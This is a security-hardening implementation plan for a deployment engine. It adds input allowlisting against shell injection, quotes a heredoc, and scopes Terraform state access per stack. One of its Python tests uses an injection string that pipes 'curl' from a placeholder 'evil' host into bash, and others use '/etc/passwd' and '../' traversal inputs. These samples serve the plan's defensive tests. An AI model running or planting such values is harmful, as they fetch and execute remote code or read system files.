# Security Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close two Critical security defects (shell injection in `deploy-stack`; cross-stack Terraform state access) and one Important (unquoted heredoc), per `docs/superpowers/specs/2026-07-25-security-hardening-design.md`.

**Architecture:** C1 adds a charset allowlist at the validate-lock gate plus an `env:`-var fix at the injection site. C2 gives each `(stack, environment)` its own state container, created during bootstrap, with `plan`/`apply` grants scoped to that container; container-create rights come from a _second_ narrow custom role assigned only at the state account. I1 quotes a heredoc delimiter.

**Tech Stack:** Python engine (`engine/cloudapp/`), Terraform (azurerm `~> 4.0`), GitHub Actions composite actions, pytest, `terraform test`.

## Global Constraints

- Never interpolate a caller-controlled value into a `run:` command string. Pass via `env:` and reference as `"$VAR"`.
- `STACK_FILE_RE = ^[A-Za-z0-9._/-]{1,255}$`; also reject absolute paths and any `..` path segment.
- Azure blob container names: 3–63 chars, lowercase alphanumerics and single hyphens, must start and end alphanumeric, **no consecutive hyphens**.
- Container name collisions are a security regression — on overflow **raise**, never truncate.
- The subscription-scoped `cloudapp-bootstrap` role must gain **no** `Microsoft.Storage/*` action. Container CRUD lives in a separate role assigned only at `var.state_account_id`.
- Never use the built-in `Storage Account Contributor` (its `listKeys` yields account keys → full data-plane on every container).
- Bootstrap-stack state stays in the shared platform container; only the **main** stack moves to a per-stack container.
- Tests: `cd engine && python3 -m pytest`; lint `python3 -m ruff check .`; Terraform: `terraform -chdir=terraform/azure/bootstrap test` and `terraform fmt -check` (invoke Python tooling via `python3 -m`).

---

### Task 1: C1 — stack-file charset allowlist + injection fix

**Files:**

- Modify: `engine/cloudapp/registry.py` (add `STACK_FILE_RE`, extend `validate_names`)
- Modify: `engine/cloudapp/cli.py:175` (pass `args.stack_file`)
- Modify: `.github/actions/deploy-stack/action.yml:80-84` (env var)
- Test: `engine/tests/py/test_registry.py`

**Interfaces:**

- Produces: `registry.validate_names(env, stack_name, caller_repo, stack_file)` — a required 4th positional argument. Raises `RegistryError` on any invalid value.

- [ ] **Step 1: Write the failing tests**

Add to `engine/tests/py/test_registry.py`:

```python
def test_validate_names_accepts_ordinary_stack_files():
    registry.validate_names("dev", "orders-api", "acme/orders", "cloud-app.yml")
    registry.validate_names("dev", "orders-api", "acme/orders", "subdir/app.yml")


def test_validate_names_rejects_shell_metacharacters_in_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names(
            "dev", "orders-api", "acme/orders", 'a";curl -s https://evil/x|bash;#.yml'
        )


def test_validate_names_rejects_absolute_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "/etc/passwd")


def test_validate_names_rejects_parent_traversal_in_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "../secrets.yml")


def test_validate_names_rejects_empty_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "")
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cd engine && python3 -m pytest tests/py/test_registry.py -k stack_file -v`
Expected: FAIL — `TypeError: validate_names() takes 3 positional arguments but 4 were given`.

- [ ] **Step 3: Implement the allowlist**

In `engine/cloudapp/registry.py`, add the pattern beside the existing ones (after `REPO_RE`):

```python
# manifest path inside the caller workspace: no shell metacharacters, no
# absolute paths, no traversal. The gate does not rely on quoting discipline
# at downstream call sites.
STACK_FILE_RE = re.compile(r"^[A-Za-z0-9._/-]{1,255}$")
```

Replace `validate_names` with:

```python
def validate_names(env, stack_name, caller_repo, stack_file):
    """Reject any caller-controlled identifier that could escape a path or a
    git command before it is ever interpolated. Runs first — it is the gate."""
    if not NAME_RE.match(env):
        raise RegistryError(f"invalid environment name '{env}'")
    if not NAME_RE.match(stack_name):
        raise RegistryError(f"invalid stack name '{stack_name}'")
    if not REPO_RE.match(caller_repo):
        raise RegistryError(f"invalid caller repo '{caller_repo}'")
    if not STACK_FILE_RE.match(stack_file or ""):
        raise RegistryError(f"invalid stack file '{stack_file}'")
    if stack_file.startswith("/") or ".." in stack_file.split("/"):
        raise RegistryError(f"invalid stack file '{stack_file}'")
```

- [ ] **Step 4: Update the call site and any existing test callers**

In `engine/cloudapp/cli.py` line ~175, pass the stack file:

```python
    registry.validate_names(args.environment, args.stack_name, args.caller_repo, args.stack_file)
```

Then find every other caller and give it a valid 4th argument:

```bash
cd /Users/vgmello-dev/repos/projects/deploy
grep -rn "validate_names(" engine/
```

Update each existing test call to pass a valid path such as `"cloud-app.yml"`.

- [ ] **Step 5: Fix the injection site**

In `.github/actions/deploy-stack/action.yml`, replace the `Parse manifest` step's `env:`/`run:` so the caller value is never interpolated:

```yaml
- name: Parse manifest
  shell: bash
  env:
    PYTHONPATH: central-workspace/engine
    # Caller-controlled: passed as a quoted "$VAR", never interpolated into
    # the command. validate-lock has already charset-checked it.
    STACK_FILE: ${{ inputs.stack-file }}
  run: >-
    python3 -m cloudapp parse-manifest
    --manifest "caller-workspace/$STACK_FILE"
    --output-dir .cloud-app
    --app-root caller-workspace
```

- [ ] **Step 6: Verify no interpolation of `stack-file` remains in any command**

Run:

```bash
cd /Users/vgmello-dev/repos/projects/deploy
grep -n 'inputs.stack-file' .github/actions/deploy-stack/action.yml
python3 -c "import yaml; yaml.safe_load(open('.github/actions/deploy-stack/action.yml')); print('parse OK')"
```

Expected: `inputs.stack-file` appears **only** on `env:` assignment lines (never inside a `run:` body); `parse OK`.

- [ ] **Step 7: Run tests + lint**

Run: `cd engine && python3 -m pytest -q && python3 -m ruff check .`
Expected: full suite green; `All checks passed!`

- [ ] **Step 8: Commit**

```bash
git add engine/cloudapp/registry.py engine/cloudapp/cli.py engine/tests/py/test_registry.py .github/actions/deploy-stack/action.yml
git commit -m "fix(security): reject unsafe stack-file paths and stop interpolating them"
```

---

### Task 2: I1 — quote the heredoc; stop interpolating the caller manifest

**Files:**

- Modify: `.github/actions/cloud-app/action.yml` (bootstrap summary heredoc; parse-manifest `--manifest`)

**Interfaces:** none (action-only).

- [ ] **Step 1: Quote the heredoc delimiter and pass values via env**

In `.github/actions/cloud-app/action.yml`, replace the whole `Bootstrap dispatch summary` step with:

```yaml
- name: Bootstrap dispatch summary
  if: always()
  shell: bash
  env:
    CONTROL_REPO: ${{ inputs.control-repo }}
    STACK_NAME: ${{ steps.parse.outputs.name }}
    DEPLOY_ENV: ${{ inputs.env }}
    CALLER_BRANCH: ${{ github.ref_name }}
  run: |
    cat <<'EOF' >> "$GITHUB_STEP_SUMMARY"
    ### Bootstrap Dispatch Summary
    EOF
    {
      echo "- **Control Repository:** \`$CONTROL_REPO\`"
      echo "- **Stack Name:** \`$STACK_NAME\`"
      echo "- **Environment:** \`$DEPLOY_ENV\`"
      echo "- **Caller Branch:** \`$CALLER_BRANCH\`"
      echo "- **[View Control Bootstrap Run]($TARGET_RUN_URL)**"
    } >> "$GITHUB_STEP_SUMMARY"
```

(`TARGET_RUN_URL` is already exported into the environment by `dispatch_and_wait.py` via `$GITHUB_ENV`, so it needs no `env:` entry.)

- [ ] **Step 2: Stop interpolating `inputs.manifest` into the parse command**

In the same file, the `Parse manifest` step currently interpolates `${{ inputs.manifest }}`. Route it through the env var the neighbouring steps already use:

```yaml
- name: Parse manifest
  id: parse
  shell: bash
  env:
    MANIFEST: ${{ inputs.manifest }}
  run: >-
    PYTHONPATH="${{ github.action_path }}/../../../engine"
    python3 -m cloudapp parse-manifest
    --manifest "$MANIFEST"
    --output-dir .cloud-app
    --app-root "."
```

- [ ] **Step 3: Verify**

Run:

```bash
cd /Users/vgmello-dev/repos/projects/deploy
python3 -c "import yaml; yaml.safe_load(open('.github/actions/cloud-app/action.yml')); print('parse OK')"
grep -n "<<'EOF'" .github/actions/cloud-app/action.yml
grep -n 'inputs.manifest' .github/actions/cloud-app/action.yml
```

Expected: `parse OK`; the quoted heredoc is present; `inputs.manifest` appears only on `env:` lines.

- [ ] **Step 4: Commit**

```bash
git add .github/actions/cloud-app/action.yml
git commit -m "fix(security): quote heredoc and stop interpolating the manifest path"
```

---

### Task 3: C2 (engine) — per-stack state container helper

Pure helper plus its two consumers. No tfvar change here — that lands with Terraform in Task 4 so the two never disagree.

**Files:**

- Modify: `engine/cloudapp/backend.py` (add `stack_container`; use it in `render` and `state_exists`)
- Test: `engine/tests/py/test_backend.py`

**Interfaces:**

- Produces: `backend.stack_container(sb: dict, name: str, env: str, stack: str = "main") -> str` — returns `sb["container"]` for `stack == "bootstrap"`, else the normalized `<name>-<env>`. Raises `BackendError` if the normalized name exceeds 63 characters.

- [ ] **Step 1: Write the failing tests**

Add to `engine/tests/py/test_backend.py`:

```python
def test_stack_container_bootstrap_uses_shared_container():
    sb = {"type": "azurerm", "container": "tfstate"}
    assert backend.stack_container(sb, "orders-api", "dev", "bootstrap") == "tfstate"


def test_stack_container_main_is_per_stack_and_env():
    sb = {"type": "azurerm", "container": "tfstate"}
    assert backend.stack_container(sb, "orders-api", "dev") == "orders-api-dev"


def test_stack_container_normalizes_trailing_hyphen():
    sb = {"type": "azurerm", "container": "tfstate"}
    # a trailing hyphen would otherwise produce the invalid "orders--dev"
    assert backend.stack_container(sb, "orders-", "dev") == "orders-dev"


def test_stack_container_rejects_overlong_name():
    sb = {"type": "azurerm", "container": "tfstate"}
    with pytest.raises(backend.BackendError, match="container name"):
        backend.stack_container(sb, "a" * 60, "production")


def test_render_uses_per_stack_container_for_main():
    lines = backend.render(ENVDIR / "dev.yml", "orders-api", "dev", stack="main")
    assert "container_name=orders-api-dev" in lines


def test_render_uses_shared_container_for_bootstrap():
    lines = backend.render(ENVDIR / "dev.yml", "orders-api", "dev", stack="bootstrap")
    assert "container_name=tfstate" in lines


def test_state_exists_probes_the_per_stack_container():
    calls = []

    def fake_run(cmd, check=False, capture=False):
        calls.append(cmd)
        return _Result(0, "true\n")

    assert backend.state_exists(ENVDIR / "dev.yml", "orders-api", "dev", fake_run) is True
    assert "orders-api-dev" in calls[0]
    assert "tfstate" not in calls[0]
```

Note: `_Result` already exists in this file from the earlier `state_exists` tests; reuse it.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cd engine && python3 -m pytest tests/py/test_backend.py -k "stack_container or per_stack or shared_container" -v`
Expected: FAIL — `AttributeError: module 'cloudapp.backend' has no attribute 'stack_container'`.

- [ ] **Step 3: Implement `stack_container`**

In `engine/cloudapp/backend.py`, add `import re` at the top (beside `from pathlib import Path`):

```python
import re
from pathlib import Path
```

Add the constant and the helper after `state_key`:

```python
_NON_ALNUM = re.compile(r"[^a-z0-9]+")
MAX_CONTAINER = 63


def stack_container(sb, name, env, stack="main"):
    """Blob container holding one stack's Terraform state.

    The bootstrap stack keeps its state in the shared platform container: a
    single per-environment control-plane identity owns every bootstrap state,
    callers never hold it, and Terraform cannot init into a container the same
    run has not created yet. The main stack gets its own container so the
    plan/apply grants can be scoped to it instead of to every stack's state.
    """
    if stack == "bootstrap":
        return sb["container"]
    candidate = _NON_ALNUM.sub("-", f"{name}-{env}".lower()).strip("-")
    if len(candidate) > MAX_CONTAINER:
        raise BackendError(
            f"state container name '{candidate}' exceeds {MAX_CONTAINER} characters; "
            "shorten the stack name or the environment name"
        )
    return candidate
```

- [ ] **Step 4: Use it in `render` and `state_exists`**

In `render`, replace the azurerm `container_name` line so it uses the helper. The azurerm branch becomes:

```python
    if sb["type"] == "azurerm":
        for field in ("resource_group", "storage_account", "container"):
            if not sb.get(field):
                raise BackendError(f"state_backend.{field} missing in {platform_path}")
        return [
            f"resource_group_name={sb['resource_group']}",
            f"storage_account_name={sb['storage_account']}",
            f"container_name={stack_container(sb, name, env, stack)}",
            f"key={key}",
            "use_oidc=true",
            "use_azuread_auth=true",
        ]
```

In `state_exists`, replace the `--container-name` value:

```python
         "--container-name", stack_container(sb, name, env, stack),
```

- [ ] **Step 5: Run tests + lint**

Run: `cd engine && python3 -m pytest -q && python3 -m ruff check .`
Expected: full suite green; `All checks passed!` (existing `test_azurerm_main_backend_lines` asserts `container_name=tfstate` for the main stack — update that expectation to `container_name=orders-api-dev`, which is the intended behaviour change).

- [ ] **Step 6: Commit**

```bash
git add engine/cloudapp/backend.py engine/tests/py/test_backend.py
git commit -m "feat(backend): per-stack state container for the main stack"
```

---

### Task 4: C2 (Terraform + tfvar) — create the container, scope the grants

Terraform and the `bootstrap-vars` tfvar change land together so no commit leaves an undeclared-variable mismatch.

**Files:**

- Modify: `terraform/azure/bootstrap/variables.tf` (replace `state_container` with `stack_state_container`)
- Modify: `terraform/azure/bootstrap/main.tf` (container resource; re-scope grants; drop `local.state_scope`)
- Modify: `terraform/azure/subscription-bootstrap/main.tf` (second narrow role + account-scoped assignment)
- Modify: `engine/cloudapp/cli.py` (`cmd_bootstrap_vars` emits `stack_state_container`)
- Test: `terraform/azure/bootstrap/tests/bootstrap.tftest.hcl`, `engine/tests/py/test_cli.py`

**Interfaces:**

- Consumes: `backend.stack_container` (Task 3).
- Produces: tfvar `stack_state_container` consumed by `terraform/azure/bootstrap`.

- [ ] **Step 1: Swap the bootstrap variable**

In `terraform/azure/bootstrap/variables.tf`, replace the `state_container` variable with:

```hcl
variable "stack_state_container" {
  description = "Per-(stack, environment) blob container holding this stack's main tfstate. Created here; the plan/apply state grants scope to it. Empty disables the container and its grants (e.g. s3 backend)."
  type        = string
  default     = ""
}
```

- [ ] **Step 2: Create the container and re-scope the grants**

In `terraform/azure/bootstrap/main.tf`, delete the `state_scope` local (it becomes unused), so `locals` reads:

```hcl
locals {
  rg = "rg-${var.name}-${var.environment}"
}
```

Add the container resource (mirrors the working precedent in `modules/shared/storage/main.tf`):

```hcl
# This stack's own tfstate container, so the plan/apply grants below can be
# scoped to it rather than to a container shared by every stack.
resource "azurerm_storage_container" "state" {
  count                 = var.state_account_id == "" || var.stack_state_container == "" ? 0 : 1
  name                  = var.stack_state_container
  storage_account_id    = var.state_account_id
  container_access_type = "private"
}
```

Replace both state role assignments so they scope to that container:

```hcl
# tfstate data-plane access, scoped to THIS stack's container only: plan reads
# the main state, apply reads+writes it. Skipped when no state container.
resource "azurerm_role_assignment" "plan_state" {
  count                = length(azurerm_storage_container.state)
  scope                = azurerm_storage_container.state[0].resource_manager_id
  role_definition_name = "Storage Blob Data Reader"
  principal_id         = azurerm_user_assigned_identity.plan.principal_id
}

resource "azurerm_role_assignment" "apply_state" {
  count                = length(azurerm_storage_container.state)
  scope                = azurerm_storage_container.state[0].resource_manager_id
  role_definition_name = "Storage Blob Data Contributor"
  principal_id         = azurerm_user_assigned_identity.apply.principal_id
}
```

- [ ] **Step 3: Add the narrow container-create role (subscription-bootstrap)**

In `terraform/azure/subscription-bootstrap/main.tf`, append — do **not** add storage actions to the existing `cloudapp-bootstrap` role, which is assigned at subscription scope:

```hcl
# Container CRUD for the bootstrap identity, in its own role assigned ONLY at
# the state account. Kept out of the cloudapp-bootstrap role because that role
# is assigned at subscription scope, where these actions would reach every
# storage account in the subscription (app workload + function backing stores).
resource "azurerm_role_definition" "state_container" {
  count = var.state_account_id == "" ? 0 : 1
  name  = "cloudapp-state-container-${var.environment}"
  scope = local.scope

  permissions {
    actions = [
      "Microsoft.Storage/storageAccounts/blobServices/containers/read",
      "Microsoft.Storage/storageAccounts/blobServices/containers/write",
    ]
    not_actions = []
  }

  assignable_scopes = [local.scope]
}

resource "azurerm_role_assignment" "state_container" {
  count              = var.state_account_id == "" ? 0 : 1
  scope              = var.state_account_id
  role_definition_id = azurerm_role_definition.state_container[0].role_definition_resource_id
  principal_id       = azurerm_user_assigned_identity.bootstrap.principal_id
}
```

- [ ] **Step 4: Emit the tfvar from `bootstrap-vars`**

In `engine/cloudapp/cli.py`, inside `cmd_bootstrap_vars`, replace the `"state_container"` entry of the `out` dict with:

```python
        "stack_state_container": (
            backend.stack_container(state, args.name, args.environment)
            if state_account_id
            else ""
        ),
```

(`backend` is already imported in `cli.py`; `state` is the `state_backend` dict read a few lines above.)

- [ ] **Step 5: Add the Terraform assertions**

Append to `terraform/azure/bootstrap/tests/bootstrap.tftest.hcl` a run block that exercises the container path:

```hcl
run "state_container_is_per_stack_and_grants_scope_to_it" {
  command = plan

  variables {
    name                  = "orders"
    environment           = "dev"
    subscription_id       = "00000000-0000-0000-0000-000000000000"
    location              = "eastus2"
    plan_subjects         = ["repo:acme/orders:pull_request"]
    apply_subjects        = ["repo:acme/orders:environment:dev"]
    state_account_id      = "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-tfstate/providers/Microsoft.Storage/storageAccounts/sttfstatedev"
    stack_state_container = "orders-dev"
  }

  assert {
    condition     = azurerm_storage_container.state[0].name == "orders-dev"
    error_message = "the stack must get its own per-(stack, env) state container"
  }

  assert {
    condition     = azurerm_role_assignment.apply_state[0].scope == azurerm_storage_container.state[0].resource_manager_id
    error_message = "apply state grant must scope to this stack's container, not a shared one"
  }

  assert {
    condition     = azurerm_role_assignment.plan_state[0].scope == azurerm_storage_container.state[0].resource_manager_id
    error_message = "plan state grant must scope to this stack's container, not a shared one"
  }
}
```

Adapt the `variables` block to whatever the existing run blocks in that file already set (copy their required variables verbatim; only add `state_account_id` and `stack_state_container`).

- [ ] **Step 6: Add the escalation regression guard**

Append to `terraform/azure/subscription-bootstrap/tests/root.tftest.hcl` (copy the `variables` block from an existing run block in that file, adding `state_account_id`):

```hcl
run "bootstrap_role_gains_no_storage_actions" {
  command = plan

  variables {
    subscription_id  = "00000000-0000-0000-0000-000000000000"
    location         = "eastus2"
    environment      = "dev"
    trusted_repo     = "vgmello/cloud-app"
    state_account_id = "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-tfstate/providers/Microsoft.Storage/storageAccounts/sttfstatedev"
  }

  assert {
    condition = length([
      for a in azurerm_role_definition.bootstrap.permissions[0].actions :
      a if startswith(a, "Microsoft.Storage/")
    ]) == 0
    error_message = "the subscription-scoped bootstrap role must not gain storage actions"
  }

  assert {
    condition     = azurerm_role_assignment.state_container[0].scope == var.state_account_id
    error_message = "container-create rights must be scoped to the state account only"
  }
}
```

- [ ] **Step 7: Verify everything**

Run:

```bash
cd /Users/vgmello-dev/repos/projects/deploy
terraform -chdir=terraform/azure/bootstrap init -backend=false && terraform -chdir=terraform/azure/bootstrap test
terraform -chdir=terraform/azure/subscription-bootstrap init -backend=false && terraform -chdir=terraform/azure/subscription-bootstrap test
terraform fmt -check -recursive terraform/
cd engine && python3 -m pytest -q && python3 -m ruff check .
```

Expected: both Terraform test suites pass; `fmt -check` clean; full engine suite green; `All checks passed!`

If a golden fixture for `bootstrap-vars` output exists and now fails on the renamed key, update the golden to the new `stack_state_container` key — that is the intended change.

- [ ] **Step 8: Commit**

```bash
git add terraform/azure/bootstrap terraform/azure/subscription-bootstrap engine/cloudapp/cli.py engine/tests
git commit -m "feat(security): per-(stack,env) state container with container-scoped grants"
```

---

## Self-Review

**Spec coverage:**

- C1 env-var fix at `deploy-stack:82` → Task 1 Step 5. ✓
- C1 charset allowlist in `validate_names` (+ absolute/`..` rejection) → Task 1 Steps 3-4. ✓
- C1 caller-side `inputs.manifest` via env → Task 2 Step 2. ✓
- I1 quoted heredoc → Task 2 Step 1. ✓
- C2 `stack_container` helper, bootstrap→shared / main→per-stack → Task 3. ✓
- C2 `render` + `state_exists` consistency → Task 3 Step 4. ✓
- C2 container created in bootstrap, grants re-scoped → Task 4 Steps 1-2. ✓
- C2 second narrow role, account-scoped, not on the subscription role → Task 4 Step 3. ✓
- C2 `stack_state_container` tfvar → Task 4 Step 4. ✓
- Tests incl. the no-`Microsoft.Storage/*` regression guard → Task 4 Steps 5-6. ✓
- Overflow raises rather than truncates (collision = security regression) → Task 3 Step 3. ✓

**Placeholder scan:** No TBD/TODO. Every code block is complete. Two steps say "copy the existing run block's variables" — that is a concrete instruction against a file the implementer has open, not a placeholder.

**Type consistency:** `validate_names(env, stack_name, caller_repo, stack_file)` matches between Task 1's definition, the `cli.py` call site, and the tests. `stack_container(sb, name, env, stack="main")` matches between Task 3's definition, both consumers, and Task 4's `cli.py` call. The tfvar name `stack_state_container` is identical in `variables.tf`, `main.tf`, `cli.py`, and the tftest.

**Ordering:** Task 4 changes Terraform and the tfvar emitter in one commit, so no intermediate state has the engine emitting a variable Terraform has not declared (or vice versa). Tasks 1-3 are independent of each other.

**Note on live validation:** `azurerm_storage_container` with `storage_account_id` routes through ARM in azurerm `~> 4.0` (the precedent in `modules/shared/storage` works this way), which is why management-plane `containers/write` is the right permission. `terraform test` runs with mock providers, so the actual authorization can only be confirmed on the first real bootstrap run — consistent with the platform's "wired, not yet live-validated" status.
